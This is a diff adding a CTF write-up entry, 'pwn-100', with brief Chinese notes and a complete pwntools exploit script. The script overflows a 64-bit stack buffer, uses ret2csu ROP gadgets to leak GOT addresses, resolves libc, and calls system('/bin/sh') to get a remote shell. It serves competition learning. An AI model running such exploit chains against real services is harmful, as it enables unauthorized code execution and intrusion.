@@ -930,3 +930,106 @@ sh.sendline(payload)
 sleep(1)
 sh.interactive()
 ```
+
+### 14. pwn-100
+题目：无
+
+思路：64位栈溢出，常规rop方法即可，本题使用了万能rop，没有提供libc需要先泄露libc地址。
+
+代码如下：
+```python
+from pwn import *
+from LibcSearcher import *
+
+sh = remote('220.249.52.133', 52332)
+elf = ELF('bee9f73f50d2487e911da791273ae5a3')
+
+ppppppr = 0x40075A
+mmmcall = 0x400740
+
+# 利用万能gadget封装一个函数指针调用功能
+def makePayload(funcAddr, arg0, arg1, arg2):
+    # 这一段在echo函数中会被复制到缓冲区中导致栈溢出
+    # 后续因为有0字符不会被复制
+    payload = b'A' * 64
+    payload += b'B' * 8
+    ret = ppppppr
+    payload += p64(ret)
+    rbx = 0
+    rbp = 1
+    r12 = funcAddr
+    r13 = arg2
+    r14 = arg1
+    r15 = arg0
+    ret = mmmcall
+    payload += p64(rbx)
+    payload += p64(rbp)
+    payload += p64(r12)
+    payload += p64(r13)
+    payload += p64(r14)
+    payload += p64(r15)
+    payload += p64(ret)
+    # mmmcall指令执行完后，还会继续执行到add rsp,8和ppppppr指令
+    # 因此首先安排56字节填充内容，然后在放置新的返回地址，这里使用main函数
+    ret = 0x4006B8
+    payload += b'C' * 56
+    payload += p64(ret)
+    return payload
+
+# 使用DynELF报错，提示找不到DT_PLTGOT???
+# def _leak(addr):
+#     payload = makePayload(elf.got['puts'], addr, 1, 1)
+#     sh.send(payload.ljust(200, b'a'))
+#     data = sh.recvuntil('\n')
+#     data = sh.recvuntil('\n').strip() + b'\x00\x00'
+#     return data[:1]
+# 
+# def leak(addr):
+#     res = b''
+#     for i in range(8):
+#         res += _leak(addr + i)
+#     print(addr, res)
+#     return res
+# 
+# d = DynELF(leak, elf=elf)
+# system = d.lookup('system', 'libc')
+# log.info('system: 0x%x', system)
+
+
+# 使用libcsearcher查找到多个结果，逐个测试就可以了
+payload = makePayload(elf.got['puts'], elf.got['puts'], 1, 1)
+sh.send(payload.ljust(200, b'a'))
+data = sh.recvuntil('\n')
+data = sh.recvuntil('\n').strip() + b'\x00\x00'
+putsAddr = u64(data)
+log.success('puts.got: 0x%x' % putsAddr)
+
+payload = makePayload(elf.got['puts'], elf.got['read'], 1, 1)
+sh.send(payload.ljust(200, b'a'))
+data = sh.recvuntil('\n')
+data = sh.recvuntil('\n').strip() + b'\x00\x00'
+readAddr = u64(data)
+log.success('read.got: 0x%x' % readAddr)
+
+libc = LibcSearcher('puts', putsAddr)
+libc.add_condition('read', readAddr)
+
+libBase = putsAddr - libc.dump('puts')
+systemAddr = libBase + libc.dump('system')
+binStrAddr = libBase + libc.dump('str_bin_sh')
+log.success('libBase: 0x%x' % libBase)
+log.success('systemAddr: 0x%x' % systemAddr)
+log.success('binStrAddr: 0x%x' % binStrAddr)
+
+bss = elf.bss() + 100
+payload = makePayload(elf.got['read'], 0, bss, 16)
+sh.send(payload.ljust(200, b'a'))
+sleep(1)
+data = sh.recvuntil('\n')
+sh.send(b'/bin/sh\x00'+p64(systemAddr))
+sleep(1)
+payload = makePayload(bss + 8, bss, 1, 1)
+sh.send(payload.ljust(200, b'a'))
+data = sh.recvuntil('\n')
+sh.interactive()
+```
